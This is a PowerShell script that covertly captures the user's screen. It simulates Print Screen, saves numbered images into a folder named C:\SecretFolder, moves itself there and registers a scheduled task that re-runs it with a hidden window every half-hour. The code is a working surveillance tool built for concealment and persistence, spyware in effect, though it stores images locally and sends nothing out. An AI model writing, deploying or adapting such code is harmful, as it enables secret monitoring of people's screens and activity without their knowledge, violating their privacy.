function Capture-Screen
{

    begin {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
    }

    process {
        #Takes the screen shot
        Start-Sleep -Milliseconds 250
        #[Windows.Forms.Sendkeys]::SendWait("%{PrtSc}")
        [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")


        #gets the image from the clipboard and sends it somewhere
        Start-Sleep -Milliseconds 250
        $bitmap = [Windows.Forms.Clipboard]::GetImage()
        $screenCapturePathBase = "C:\SecretFolder\ScreenCapture"

        #add number to screenshots before saving
        $c = 0
        while (Test-Path "${screenCapturePathBase}${c}.jpg") {
            $c++
        }
        $bitmap.Save("${screenCapturePathBase}${c}.jpg")
    }

}

#current directory of script
$myPath = $PSCommandPath

#Checks if the task is already scheduled if not it will schedule it
try{
    Get-ScheduledTask -TaskName "ScreenCapture1" -ErrorAction Stop
    Write-Host "Task is already scheduled"
}
catch {
    #Assuming this is the first run of the script this will create a folder for the images
    #Create Directory
    md "C:\SecretFolder" -ErrorAction silentlycontinue

    #Moves script to new folder
    Move-Item -Path $myPath -Destination "C:\SecretFolder" -ErrorAction silentlycontinue
    
    #the action running is this script itself
    $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -File "C:\SecretFolder\ScreenShotCapture.ps1"'

    #Script will run every half-hour
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) `
        -RepetitionInterval (New-TimeSpan -Minutes 30)

    #Register the task
    Register-ScheduledTask -TaskName "ScreenCapture1" -Action $action -Trigger $trigger -Description "captures screenshots every half-hour"
}

#calls the function
Capture-Screen

#Get rid of it when you are done
#Unregister-ScheduledTask -TaskName 'ScreenCapture1' -Confirm:$false